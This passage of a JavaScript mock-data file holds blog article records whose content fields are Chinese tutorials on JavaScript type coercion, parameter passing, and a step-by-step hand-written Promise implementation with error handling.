"1",即NaN\n```\n\n上面代码的ToPrimitive运算中，PreferredType都没提供，也就是hint为"default"时，PreferredType为默认的Number，即都是先执行valueOf，如果valueOf返回的是基本类型就返回该基本类型值；否则，再执行toString，如果toString返回的是基本类型，就返回该基本类型值；否则，就抛出TypeError错误，先执行valueOf，但{}的valueOf都是对象本身，不是基本类型，然后执行toString，{}的toString都是"[object Object]"\n\n### 案例2\n\n```js\nlet obj = {\n  valueOf: function () {\n      console.log(\'valueOf\');\n      return {};\n  },\n  toString: function () {\n      console.log(\'toString\');\n      return \'obj\';\n  }\n}\nconsole.log(1 + obj);  //valueOf -> toString -> \'1obj\'\nconsole.log(+obj); //valueOf -> toString -> NaN\nconsole.log(\'\' + obj); //valueOf -> toString -> \'obj\'\n```\n\n### 案例3\n\n```js\nvar a = {\n    valueOf: function () {\n        console.log(\'valueOf\');\n        return \'1\'\n    },\n    toString: function () {\n        console.log(\'toString\');\n        return \'2\'\n    }\n}\n\n// console.log(+a);    // 先打印valueOf,然后打印数字1\n// console.log(a + \'\');    //先打印valueOf,然后打印字符串1\n// console.log(a - \'\');    //先打印valueOf,然后打印数字1\n```\n\n### 案例4\n\n```js\nlet obj = {\n  valueOf: function () {\n      console.log(\'valueOf\');\n      return {}; // object\n  },\n  toString: function () {\n      console.log(\'toString\');\n      return {}; // object\n  }\n}\n\nconsole.log(obj + obj);  //valueOf -> toString -> error!\n```\n\n### 案例5\n\n```js\nvar arr = [1, 2]\nvar arr1 = [1, 2]\narr.valueOf = function () {\n    console.log(\'valueOf\');\n    return 1\n}\narr.toString = function () {\n    console.log(\'toString\');\n    return 2\n}\n// console.log(arr.valueOf());\nconsole.log(arr - [1]);          //valueOf--->0\nconsole.log(arr1 - [1]);         //NaN\n```\n\n### 案例6\n\n```js\nconsole.log(1 + "2" + "2");     //"122"\nconsole.log(1 + +"2" + "2");    //"32"\nconsole.log("A" - "B" - "2");   //NaN\nconsole.log("A" - "B" + "2");   //"NaN2"\nconsole.log("A" - "B" + 2);     //NaN\n```\n\n### 案例7\n\n```js\nvar a = [0];\nif (a) {\n  console.log(a == true);//false\n} else {\n  console.log(a);\n}\n```\n\n首先a是也给对象，对象是真值，因此走console.log(a==true)，即[0] == true，[0]是转化成真值对象，并不是boolean的false值，因此，这里存在隐式转换，\n\n[0] == true，对象和非对象进行比较，将[0]转化成基本值，即”0“ ，因此转化为：”0“ == true，变成了其他类型和布尔值比较，将布尔值转化为数字，即将true转化为1，因此转化为了：”0“ == 1，变成了字符串和数字比较，将字符串转化为数字，即将”0“转化为0，即最终转化为：0 == 1，因此结果为false\n\n### {}+[]\n\n```js\nvar a = {} + []\nconsole.log(a); //"[object Object]"\nconsole.log({} + []);//"[object Object]"\n```\n\n注意：如果在浏览器控制台直接输入{}+[]，有的浏览器会将前面的{}解析成block，即直接就是+[]，即强制求出数字值的`Number([])`运算，相当于`Number("")`运算，最后得出的是`0`数字。但是如果在浏览器输入({}) + []，给前面的{}添加一个括号，就不会把括号里面的{}解析成block，而是解析成一个对象，最终输出“[object Object]”\n\n# 参考\n\n《你不知道的JavaScript》\n\nhttps://segmentfault.com/a/1190000008038678?utm_source=sf-related\n\nhttps://segmentfault.com/a/1190000016724285?utm_source=tag-newest\n\nhttps://segmentfault.com/a/1190000016325587\n\nhttps://juejin.cn/post/6844903555548053511\n\nhttps://zhuanlan.zhihu.com/p/104362868',
      click: 70,
      createdAt: '2021-03-11T03:02:47.000Z',
      updatedAt: '2021-03-17T07:09:41.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 70,
            article_id: 70,
            type_id: 1,
            createdAt: '2021-03-11T03:02:47.000Z',
            updatedAt: '2021-03-11T03:02:47.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 70,
            user_id: 1,
            article_id: 70,
            createdAt: '2021-03-11T03:02:47.000Z',
            updatedAt: '2021-03-11T03:02:47.000Z',
          },
        },
      ],
      comments: [],
      tags: [],
    },
    {
      id: 69,
      title: 'Js 参数传递',
      is_comment: 1,
      status: 1,
      img: '/1615179758539js参数传递.png',
      content:
        '# Js函数里面的参数\n\n> 在看 Js参数传递时，先看最基本的，会为下面做铺垫\n\n```js\nfunction fn() {\n    var a = 100\n    console.log(a); //100\n}\nfn()\nconsole.log(a); // 报错a is not defined\n```\n\n```js\nfunction fn() {\n    a = 100 //这里不是var a = 100，而且，也没有定义局部变量var a，因此这里约等于window.a = 100\n    console.log(a); //100\n}\nfn()\nconsole.log(a); //100\n```\n\n```js\nfunction fn(a) {\n    console.log(a); //100\n    a = 100 //由于这里有形参a，因此，这里的a = 100，约等于 var a = 100\n    console.log(a); //100\n}\nfn(100)\nconsole.log(a); //报错a is not defined\n```\n\n> 上述代码完全等价于：\n\n```js\nfunction fn(a) {\n    var a\n    console.log(a); //100\n    a = 100\n    console.log(a); //100\n}\nfn(100)\nconsole.log(a); //报错a is not defined\n```\n\n\n\n# Js参数传递\n\n> 在这里，直接通过具体案例一个个循环渐进的说明 js的参数传递\n\n## 普通类型参数传递\n\n首先就是最简单的普通类型（string,number,boolean,null,undefined,symbol）赋值\n\n> 案例1：\n\n```js\nvar a = 1\na = 2\n\nconsole.log(a); //2\n```\n\n> 案例2：\n\n```js\nvar a = 1\nvar b = a\nb = 2\nconsole.log(a); //1\nconsole.log(b); //2\n```\n\n> 案例3：\n\n```js\nvar a = 1\nfunction fn(a) {\n    console.log(a); //这里的a是第一次接收到的形参a，即1\n    a = 100 //这里由于已经定义了形参a，因此约等于 var a = 100\n    b = a   //这里由于没有定义过形参b，因此这里约等于window.b = a\n    console.log(a); //这里的a是var a = 100后的a，即100\n    console.log(b); //这里的b是window.b = 100，即100\n}\nfn(a)\nconsole.log(a); //1\nconsole.log(b); //100\n```\n\n> 案例4（完全等价于案例3）：\n\n```js\nvar a = 1\nfunction fn(aa) {\n    console.log(aa); //这里的aa是第一次接收到的形参a，即1\n    aa = 100 //这里由于已经定义了形参aa，因此约等于 var aa = 100\n    b = aa   //这里由于没有定义过形参b，因此这里约等于window.b = aa\n    console.log(aa); //这里的aa是var aa = 100后的a，即100\n    console.log(b); //这里的b是window.b = 100，即100\n}\nfn(a)\nconsole.log(a); //1\nconsole.log(b); //100\nconsole.log(aa);    //报错报错aa is not defined\n```\n\n> 案例5（完全等价于案例4）：\n\n```js\nvar a = 1\nfunction fn(aa) {\n    var aa\n    console.log(aa); //这里的aa是第一次接收到的形参a，即1\n    aa = 100 //这里由于已经定义了形参aa，因此约等于 var aa = 100\n    b = aa   //这里由于没有定义过形参b，因此这里约等于window.b = aa\n    console.log(aa); //这里的aa是var aa = 100后的a，即100\n    console.log(b); //这里的b是window.b = 100，即100\n}\nfn(a)\nconsole.log(a); //1\nconsole.log(b); //100\nconsole.log(aa);    //报错报错aa is not defined\n```\n\n> 案例3,4,5重点：\n\n```js\n/**\n * 重点：fn函数里面的aa = 100，根据案例2可粗略转化为：\n * var a = 1\n * var aa = a\n * aa = 100\n * console.log(a)   //1\n * console.log(aa)  //100\n * 因此，fn函数里面的aa = 100，并不会修改fn函数外面的a !\n * 并且：aa是fn的局部变量，所以aa = 100，会将fn函数里面的aa修改成100！\n*/\n```\n\n## 引用数据类型参数传递\n\n> 案例1：\n\n```js\nvar a = { age: 1 }\na = { age: 100 }\nconsole.log(a); //{age:100}\n```\n\n> 案例2：\n\n```js\nvar a = { age: 1 }\nvar b = a\nb = { age: 100 }\nconsole.log(a); //{age:1}\nconsole.log(b); //{age:100}\n```\n\n> 案例3：\n\n```js\nvar a = { age: 1 }\nfunction fn(a) {\n    console.log(a); //{age:1}\n    a = { age: 100 }    //这里由于已经定义了形参a，因此a = {age:100}约等于var a = {age:100}\n    console.log(a); //{age:100}\n}\n\nfn(a)\nconsole.log(a); //{age:1}\n```\n\n> 案例3完全等价于下述代码：\n\n```js\nvar a = { age: 1 }\nfunction fn(aa) {\n    var aa\n    console.log(aa); //{age:1}\n    aa = { age: 100 }    //这里由于已经定义了形参aa，因此aa = {age:100}约等于var aa = {age:100}\n    console.log(aa); //{age:100}\n}\n\nfn(a)\nconsole.log(a); //{age:1}\n\n/**\n * 重点：执行fn(a)，将a当做形参传给fn函数里的aa，\n * 首先在fn函数内部定义fn的局部变量var aa，然后将fn(a)的a给aa，即：\n * var a = {age:1}\n * var aa = a\n * aa = {age:100}\n * 根据案例2可知：此时的a:{age:1},aa:{age:100}\n*/\n```\n\n',
      click: 68,
      createdAt: '2021-03-08T05:02:36.000Z',
      updatedAt: '2021-03-08T05:02:36.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 69,
            article_id: 69,
            type_id: 1,
            createdAt: '2021-03-08T05:02:36.000Z',
            updatedAt: '2021-03-08T05:02:36.000Z',
          },
        },
      ],
      stars: [
        {
          id: 4,
          article_id: 69,
          comment_id: -1,
          from_user_id: 22,
          to_user_id: -1,
          createdAt: '2021-03-11T07:54:35.000Z',
          updatedAt: '2021-03-11T07:54:35.000Z',
        },
      ],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 69,
            user_id: 1,
            article_id: 69,
            createdAt: '2021-03-08T05:02:36.000Z',
            updatedAt: '2021-03-08T05:02:36.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 68,
      title: '实现Promise，有手就行巨详细，不看血亏',
      is_comment: 1,
      status: 1,
      img: '/1614615633247实现promise.png',
      content:
        "# Promise是什么\r\n\r\n`promise`表示一个异步操作的最终结果。和一个`promise`进行交互的主要方式是通过它的`then`方法，该方法注册回调要么接收一个`promise`的最终值，要么接收`promise`为什么不能被**满足**的原因。\r\n\r\n> Promise 是异步编程的一种解决方案\r\n\r\n> Promise是同步的，Promise.then也是同步的，但是Promise.then里面的回调（then,catch,finally）是异步的，这是我自己实现Promise后的得出来的结论，如果有错还请留言指正一下~\r\n\r\n# Js事件机制\r\n\r\n宏任务：script，setTimeout，setInterval\r\n\r\n微任务：Promise\r\n\r\n优先级：主线程>微任务>宏任务\r\n\r\n```js\r\nvar promise = new Promise(function (resolve, reject) {\r\n    console.log('我是promise里的同步代码');\r\n    setTimeout(() => {\r\n        console.log('我是promise里的异步代码');\r\n        resolve('我是promise里的异步代码执行完成')\r\n    }, 2000);\r\n})\r\nconsole.log('我是promise外的同步代码');\r\n\r\nsetTimeout(() => {\r\n    console.log('定时器1s');\r\n}, 1000);\r\npromise.then(res => {\r\n    console.log(res);\r\n})\r\n\r\n/**\r\n * 打印顺序：\r\n * 1.先执行promise里的同步代码，打印：我是promise里的同步代码\r\n * 2.遇到定时器，加入宏任务，promise里没有同步代码了，返回promise外部\r\n * 3.遇到同步代码，打印：我是promise外的同步代码\r\n * 4.又遇到定时器，加入宏任务\r\n * 5.遇到promise.then，加入微任务\r\n * 6.此时主线程代码执行完毕，先去微任务队列查看，即5，没有任务\r\n * 7.查看宏任务队列，4先执行完成，打印：定时器1s\r\n * 8.再查看微任务任务队列，还是没有，再执行宏任务队列，即执行5，打印：我是promise里的异步代码\r\n * 9.然后执行resolve，加入微任务队列，然后宏任务队列执行完毕，执行微任务队列，打印：我是promise里的异步代码执行完成\r\n * 结果：\r\n * 我是promise里的同步代码\r\n * 我是promise外的同步代码\r\n * 定时器1s\r\n * 我是promise里的异步代码\r\n * 我是promise里的异步代码执行完成\r\n*/\r\n```\r\n\r\n```js\r\nsetTimeout(function () {\r\n    console.log('1')\r\n});\r\n\r\nnew Promise(function (resolve) {\r\n    console.log('2');\r\n    resolve();\r\n}).then(function () {\r\n    console.log('3')\r\n});\r\n\r\nconsole.log('4');\r\n\r\n// 2,4,3,1\r\n```\r\n\r\n# 实现Promise\r\n\r\n## 最基本\r\n\r\n> 首先实现最基本的，new _Promise(executor)的时候，传入executor，它是一个函数，有两个形参，第一个是resolve，第二个是reject，这两个形参同时也是一个函数，在executor里面可以执行这两个函数，在执行两个函数的同时，需要改变 _Promise里面的状态以及对于值/原因\r\n\r\n```js\r\n/**\r\n * 根据Promise/A+规范实现Promise\r\n * Promise/A+为了简便，以下简称为规范\r\n*/\r\nfunction _Promise(executor) {\r\n\r\n    var _this = this // 先保存this\r\n    _this.status = 'pending' //规范要求的状态\r\n    _this.value = undefined //规范要求成功返回的值\r\n    _this.season = undefined //规范要求失败返回的原因\r\n    _this.exception = undefined //规范要求异常抛出的值\r\n\r\n    // 成功执行的函数\r\n    function resolve(value) {\r\n        // 规范规定，只能从pending变成fulfilled或者从pending变成rejected\r\n        // 比如：如果当前status从pending变成fulfilled，\r\n        // 则不能再次对status进行修改成pending或者reject。\r\n        if (_this.status == 'pending') {\r\n            _this.status = 'fulfilled'\r\n            _this.value = value\r\n        }\r\n    }\r\n    // 失败执行的函数\r\n    function reject(season) {\r\n        // 规范规定，只能从pending变成fulfilled或者从pending变成rejected\r\n        // 比如：如果当前status从pending变成fulfilled，\r\n        // 则不能再次对status进行修改成pending或者reject。\r\n        if (_this.status == 'pending') {\r\n            _this.status = 'rejected'\r\n            _this.season = season\r\n        }\r\n    }\r\n    // 因为new Promise(fn)时，会立即执行fn\r\n    // 所以实现_Promise时，也要立即执行传进来的executor函数\r\n    executor(resolve, reject)\r\n}\r\n\r\nvar p = new _Promise(function (resolve, reject) {\r\n    console.log('_Promise里的同步代码')\r\n    resolve(200)\r\n    // reject(500)\r\n})\r\nconsole.log(p)\r\n// 打印顺序：\r\n// _Promise里的同步代码\r\n// _Promise {status: \"fulfilled\", value: 200, season: undefined, exception: undefined}\r\n```\r\n\r\n## then方法\r\n\r\n记住：**Promise执行完成有结果的时候，会调用的then方法**\r\n\r\njs，单线程，异步，所以不管Promise执行完executor有没有结果，都会往下执行，执行到then，需要传一个或两个函数分别作为成功/失败结果的回调\r\n\r\n这里采用回调的方式，在Promise的executor里面的代码有结果后，会把值/原因，传给then里面对应的回调函数并执行\r\n\r\n**then是同步的，只要执行到then了，就会执行里面的代码，但是并不一定会立即执行传给then的回调，因为里面的回调受Promise.executor里面的代码影响，如果这个回调在Promise.executor里面是同步的，就会立即执行，如果是异步的，就不会立即执行**\r\n\r\n```js\r\n/**\r\n * Promise执行完成有结果的时候，会调用的then方法，该方法接收两个参数，\r\n * 第一个是成功时候的回调函数，第二个是失败时候的回调函数，\r\n * 所以实现_Promise时，也要实现这个then方法\r\n */\r\n\r\n_Promise.prototype.then = function (onFulfilled, onRejected) {\r\n    if (_this.status == 'fulfilled') {\r\n        onFulfilled(_this.value)\r\n    }\r\n    if (_this.status == 'rejected') {\r\n        onRejected(_this.season)\r\n    }\r\n}\r\n\r\nvar p = new _Promise(function (resolve, reject) {\r\n    console.log('_Promise里的同步代码')\r\n    // resolve(200)\r\n    reject(500)\r\n})\r\np.then((res) => {\r\n    console.log(res)\r\n    console.log(p)\r\n}, (err) => {\r\n    console.log(err)\r\n    console.log(p)\r\n})\r\nconsole.log(111);\r\n\r\n// 打印顺序：\r\n// _Promise里的同步代码\r\n// 500\r\n// _Promise {status: \"rejected\", value: null, season: 500, exception: null}\r\n// 111\r\n```\r\n\r\n> 原生Promise的then方法是异步的，应该先打印111，然后再执行then方法，而现在的实现的_Promise是同步的，先执行then再执行打印111，因此需要修改一下，利用定时器模拟异步\r\n\r\n```js\r\n_Promise.prototype.then = function (onFulfilled, onRejected) {\r\n    if (_this.status == 'fulfilled') {\r\n        setTimeout(() => {\r\n            onFulfilled(_this.value)\r\n        }, 0);\r\n\r\n    }\r\n    if (_this.status == 'rejected') {\r\n        setTimeout(() => {\r\n            onRejected(_this.season)\r\n        }, 0);\r\n    }\r\n}\r\nvar p = new _Promise(function (resolve, reject) {\r\n    console.log('_Promise里的同步代码')\r\n    // resolve(200)\r\n    reject(500)\r\n})\r\n\r\np.then((res) => {\r\n    console.log(res)\r\n    console.log(p)\r\n}, (err) => {\r\n    console.log(err)\r\n    console.log(p)\r\n})\r\nconsole.log(111);\r\n\r\n// 打印顺序：\r\n// _Promise里的同步代码\r\n// 111\r\n// 500\r\n// _Promise {status: \"rejected\", value: null, season: 500, exception: null}\r\n```\r\n\r\n## 捕获错误\r\n\r\n### 原生Promise的捕获错误\r\n\r\n> 原生Promise在遇到错误有两种可能\r\n>\r\n> 1. executor函数里面的代码有错误，但是没有被then的reject捕获，会修改Promise的状态为rejected，并抛出错误\r\n> 2. executor函数里面的代码有错误，但是有被then的reject捕获，不会抛出错误，会修改Promise的状态为rejected，然后返回错误原因\r\n> 3. 如果没有then，但是有Promise.catch，也不会报错，会修改Promise的状态为rejected，然后返回错误原因\r\n>\r\n> 总结：原生Promise只要有错误，都会修改状态为rejected，\r\n>\r\n> 如果有then捕获错误，就会把错误信息通过reject返回，不会抛出错误；\r\n>\r\n> 如果没有then捕获错误，就不会reject，然后抛出错误；\r\n>\r\n> 如果有catch捕获错误，就会把错误信息通过reject返回，不会抛出错误；\r\n>\r\n> 即只要错误有被Promise捕获到，就会通过reject返回\r\n\r\n#### 没有Promise.then回调\r\n\r\n```js\r\n// executor函数里面的代码有错误，但是没有被then的reject捕获，会修改Promise的状态为rejected，并抛出错误\r\nvar p = new Promise((resolve, reject) => {\r\n    throw new Error('xxx')\r\n})\r\nconsole.log(p);\r\n\r\n// 打印顺序：\r\n// Promise {<rejected>: Error: xxx at file:///E:/hss/my-study-notes/%E9%87%8D%E5%AD%A6js/promise/promise%E9%94%99%E8%AF…}\r\n// 报错：Uncaught (in promise) Error: xxx\r\n```\r\n\r\n#### 有Promise.then回调，但没有reject回调\r\n\r\n如果有Promise.then回调，但then里面没有第二个reject的回调函数，也捕获不到错误，会报错\r\n\r\n```js\r\n// executor函数里面的代码有错误，但是没有被then的reject捕获，会修改Promise的状态为reject，并抛出错误\r\nvar p = new Promise((resolve, reject) => {\r\n    throw new Error('xxx')\r\n})\r\np.then(res => {\r\n    console.log(res);\r\n})\r\nconsole.log(p);\r\n\r\n// 打印顺序：\r\n// Promise {<rejected>: Error: xxx at file:///E:/hss/my-study-notes/%E9%87%8D%E5%AD%A6js/promise/promise%E9%94%99%E8%AF…}\r\n// 报错：Uncaught (in promise) Error: xxx\r\n```\r\n\r\n#### 有Promise.then回调，且有reject回调\r\n\r\n```js\r\n// executor函数里面的代码有错误，但是有被then的reject捕获，不会抛出错误，会修改Promise的状态为rejected，然后通过reject回调返回错误原因\r\nvar p = new Promise((resolve, reject) => {\r\n    throw new Error('xxx')\r\n})\r\np.then(res => {\r\n    console.log('成功');\r\n    console.log(res);\r\n}, err => {\r\n    console.log('失败');\r\n    console.log(err);\r\n})\r\nconsole.log(p);\r\n\r\n// 打印顺序：\r\n// Promise {<rejected>: Error: xxx at file:///E:/hss/my-study-notes/%E9%87%8D%E5%AD%A6js/promise/promise%E9%94%99%E8%AF…}\r\n// 失败\r\n// Error: xxx\r\n```\r\n\r\n#### 有Promise.catch回调\r\n\r\n```js\r\n// executor函数里面的代码有错误，但是有被Promise.catch捕获，会修改Promise的状态为rejected，然后通过reject回调返回错误原因\r\nvar p = new Promise((resolve, reject) => {\r\n    throw new Error('xxx')\r\n})\r\np.catch(err => {\r\n    console.log('失败catch');\r\n    console.log(err);\r\n})\r\nconsole.log(p);\r\n\r\n// 打印顺序：\r\n// Promise {<rejected>: Error: xxx at file:///E:/hss/my-study-notes/%E9%87%8D%E5%AD%A6js/promise/promise%E9%94%99%E8%AF…}\r\n// 失败catch\r\n// Error: xxx\r\n```\r\n\r\n#### 同时有then的reject和Promise.catch\r\n\r\n如果异常被then里面的reject抛出了，再使用catch就不生效了，错误只会被捕获一次\r\n\r\n```js\r\nvar p = new Promise((resolve, reject) => {\r\n    throw new Error('xxx')\r\n})\r\np.then(res => {\r\n    console.log('成功');\r\n    console.log(res);\r\n}, rej => {\r\n    console.log('失败');\r\n    console.log(rej);\r\n}).catch(err => {\r\n    console.log('失败catch');\r\n    console.log(err);\r\n})\r\nconsole.log(p);\r\n\r\n// 打印顺序：\r\n// Promise {<rejected>: Error: xxx at file:///E:/hss/my-study-notes/%E9%87%8D%E5%AD%A6js/promise/promise%E9%94%99%E8%AF…}\r\n// 失败\r\n// Error: xxx\r\n```\r\n\r\n### 实现_Promise的捕获错误\r\n\r\n> 需要修改两处，此处虽然修改的内容不多，但是其中的逻辑非常nice，我看的实现Promise视频都没有怎么在意这个捕获错误，但是我自己想了许久，得出下面的代码，这样实现的_Promise就和原生的Promise拥有一致的捕获错误机制了\r\n\r\n第一处，也是最主要的，在只执行executor函数外面包一层try/catch，具体看下面代码，重要的是理解其中的逻辑。\r\n\r\n```js\r\n// 因为new Promise(fn)时，会立即执行fn\r\n// 所以实现_Promise时，也要立即执行传进来的executor函数\r\n// 捕获异常，如果Promise有reject或catch，就将异常通过reject返回，\r\n// 如果Promise没有捕获异常，就抛出错误\r\n// 实现的_Promise也要和原生Promise一致\r\ntry {\r\n    executor(resolve, reject)\r\n} catch (e) {\r\n    // 如果捕获到异常，把异常存在exception里（后面抛不抛出异常再通过其他条件判断）\r\n    _this.exception = e\r\n    // 只要有异常，都要将Promise的状态改为rejected（这样的reason就是报错信息了）\r\n    reject(e)\r\n    // 利用定时器，将抛出错误的操作延迟一个循环，等判断用户有没有执行then的reject再判断抛不抛出错误\r\n    // 步骤：\r\n    // 1，捕获到错误，存到exception；\r\n    // 2，遇到定时器宏任务，把定时器的回调放进宏任务队列，等待函数执行栈全部执行完再执行\r\n    // 3，然后就会继续往下执行，执行完executor里面的代码后，继续执行函数执行栈的其余代码，\r\n    // 4，执行完所有函数执行栈的代码后，如果都没有遇到_Promise.then的reject，\r\n    // 5，那么此时的exception就还是报错信息（因为只要遇到了reject，就会将exception清空）\r\n    // 6，就会执行这个定时器任务回调，\r\n    // 7，exception有值就抛出错误\r\n    setTimeout(() => {\r\n        if (_this.exception) {\r\n            setTimeout(() => {\r\n                throw new Error(e)\r\n            }, 0);\r\n        }\r\n    }, 0);\r\n}\r\n```\r\n\r\n第二处就是在reject回调函数里将exception值重设为空，因为原生Promise遇到异常，有reject回调（或者Promise.catch，这里暂不考虑Promise.catch的情况）才会将抛出异常转变为将异常信息通过reject回调返回\r\n\r\n```js\r\n// 失败执行的函数\r\nfunction reject(season) {\r\n    // 规范规定，只能从pending变成fulfilled或者从pending变成rejected\r\n    // 比如：如果当前status从pending变成fulfilled，\r\n    // 则不能再次对status进行修改成pending或者rejected。\r\n    if (_this.status == 'pending') {\r\n        _this.status = 'rejected'\r\n        // 有then回调且then回调里有reject回调就不要抛出错误，将错误通过reject返回\r\n        _this.season = season\r\n        _this.exception = undefined\r\n        // 发布\r\n        _this.onRejectedCbs.forEach(fn => fn())\r\n    }\r\n}\r\n```\r\n\r\n\r\n\r\n## Promise.executor中的异步\r\n\r\n> 在实现_Promise的时候，如果 _Promise里面的结果是在异步函数里面，则需要采用发布订阅的方式，让它在异步操作执行完成的时候再执行成功/失败的回调\r\n\r\n对于在Promise里的发布订阅模式，这里先简单解释下（因为我还没深入去了解设计模式~~~），首先如果实现的_Promise.executor里面的代码是同步的，遇到resolve或reject，都就会一直执行对应的回调，将 _Promise的状态修改为fulfilled/rejected，然后继续往下执行then，再执行对应状态的回调；\r\n\r\n但是，如果此时 _Promise.executor里的代码是异步的，比如resolve方法放在一个异步函数（比如，定时器）的回调里，而又因为js的事件机制，不会等到这个异步函数执行完成再去继续往下执行，他回将这个异步函数的回调放到任务队列里，等主线程执行栈执行完成了再去执行这个任务队列里面的回调，因此，如果resolve方法如果在异步函数里，js就会将他放入任务队列，然后继续往下执行\r\n\r\n因此，当js执行完 _Promise.executor后，继续往下执行（遇到then()，这里注意，是遇到then()，加了小括号，是会立即执行这个then的，然后就会执行then函数，）这时候进入then，而当前的状态因为没有被修改（因为那个resolve回调函数被放到任务队列了，还在等着，并没有执行），还是pending，上面实现的then方法只对成功和失败的状态做了处理，没有对pending做处理，因此我们要在状态为pending的情况下操作一下，因为 _Promise.executor里面的回调迟早都是会执行的，**我们不能确定里面的回调什么时候执行，但是能确定的是，如果里面的回调执行了就会 _Promise修改状态**，**因此，我们可以在then的时候，将所有的成功/失败后回调分别放到数组里保存，等 _Promise.executor返回结果了（即执行了 _Promise.executor里面的成功/失败回调函数），就会修改 _Promise的状态值，此时，再加一个操作，遍历执行所有收集到的回调，其实执行的就是then的时候接收到的回调，但是只是因为异步问题， _Promise里面的状态没改变，给延迟了，拖到了现在状态改变了才执行**，\r\n\r\n```js\r\nfunction _Promise(executor) {\r\n\r\n    var _this = this // 先保存this\r\n    _this.status = 'pending' //规范要求的状态\r\n    _this.value = undefined //规范要求成功返回的值\r\n    _this.season = undefined //规范要求失败返回的原因\r\n    _this.exception = undefined //规范要求异常抛出的值\r\n\r\n    _this.onFulfilledCbs = [] //收集成功回调\r\n    _this.onRejectedCbs = [] //收集失败回调\r\n\r\n    // 成功执行的函数\r\n    function resolve(value) {\r\n        // 规范规定，只能从pending变成fulfilled或者从pending变成rejected\r\n        // 比如：如果当前status从pending变成fulfilled，\r\n        // 则不能再次对status进行修改成pending或者rejected。\r\n        if (_this.status == 'pending') {\r\n            _this.status = 'fulfilled'\r\n            _this.value = value\r\n            // 发布\r\n            _this.onFulfilledCbs.forEach(fn => fn())\r\n        }\r\n    }\r\n    // 失败执行的函数\r\n    function reject(season) {\r\n        // 规范规定，只能从pending变成fulfilled或者从pending变成rejected\r\n        // 比如：如果当前status从pending变成fulfilled，\r\n        // 则不能再次对status进行修改成pending或者rejected。\r\n        if (_this.status == 'pending') {\r\n            _this.status = 'rejected'\r\n            // 有then回调且then回调里有reject回调就不要抛出错误，将错误通过reject返回\r\n            _this.season = season\r\n            _this.exception = undefined\r\n            // 发布\r\n            _this.onRejectedCbs.forEach(fn => fn())\r\n        }\r\n    }\r\n\r\n    // 因为new Promise(fn)时，会立即执行fn\r\n    // 所以实现_Promise时，也要立即执行传进来的executor函数\r\n    // 捕获异常，如果Promise有reject或catch，就将异常通过reject返回，\r\n    // 如果Promise没有捕获异常，就抛出错误\r\n    // 实现的_Promise也要和原生Promise一致\r\n    try {\r\n        executor(resolve, reject)\r\n    } catch (e) {\r\n        // 如果捕获到异常，把异常存在exception里（后面抛不抛出异常再通过其他条件判断）\r\n        _this.exception = e\r\n        // 只要有异常，都要将Promise的状态改为rejected（这样的reason就是报错信息了）\r\n        reject(e)\r\n        // 利用定时器，将抛出错误的操作延迟一个循环，等判断用户有没有执行then的reject再判断抛不抛出错误\r\n        // 步骤：\r\n        // 1，捕获到错误，存到exception；\r\n        // 2，遇到定时器宏任务，把定时器的回调放进宏任务队列，等待函数执行栈全部执行完再执行\r\n        // 3，然后就会继续往下执行，执行完executor里面的代码后，继续执行函数执行栈的其余代码，\r\n        // 4，执行完所有函数执行栈的代码后，如果都没有遇到_Promise.then的reject，\r\n        // 5，那么此时的exception就还是报错信息（因为只要遇到了reject，就会将exception清空）\r\n        // 6，就会执行这个定时器任务回调，\r\n        // 7，exception有值就抛出错误\r\n        setTimeout(() => {\r\n            if (_this.exception) {\r\n                setTimeout(() => {\r\n                    throw new Error(e)\r\n                }, 0);\r\n            }\r\n        }, 0);\r\n    }\r\n\r\n    /**\r\n     * Promise执行完成有结果的时候，会调用的then方法，该方法接收两个参数，\r\n     * 第一个是成功时候的回调函数，第二个是失败时候的回调函数，\r\n     * 所以实现_Promise时，也要实现这个then方法\r\n     */\r\n\r\n    _Promise.prototype.then = function (onFulfilled, onRejected) {\r\n        // console.log('then')\r\n        if (_this.status == 'fulfilled') {\r\n            setTimeout(() => {\r\n                onFulfilled(_this.value)\r\n            }, 0);\r\n\r\n        }\r\n        if (_this.status == 'rejected') {\r\n            setTimeout(() => {\r\n                onRejected(_this.season)\r\n            }, 0);\r\n        }\r\n        if (_this.status == 'pending') {\r\n            // 采用发布订阅方式，将等待的结果分别保存到成功和失败数组里\r\n            // 订阅\r\n            _this.onFulfilledCbs.push(function () {\r\n                onFulfilled(_this.value)\r\n            })\r\n            // 订阅\r\n            _this.onRejectedCbs.push(function () {\r\n                onRejected(_this.season)\r\n            })\r\n        }\r\n    }\r\n}\r\n\r\n\r\n```\r\n\r\n## Promise的链式调用\r\n\r\n待定\r\n\r\n",
      click: 108,
      createdAt: '2021-03-01T16:20:36.000Z',
      updatedAt: '2021-03-01T16:20:36.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 68,
            article_id: 68,
            type_id: 1,
            createdAt: '2021-03-01T16:20:36.000Z',
            updatedAt: '2021-03-01T16:20:36.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 68,
            user_id: 1,
            article_id: 68,
            createdAt: '2021-03-01T16:20:36.000Z',
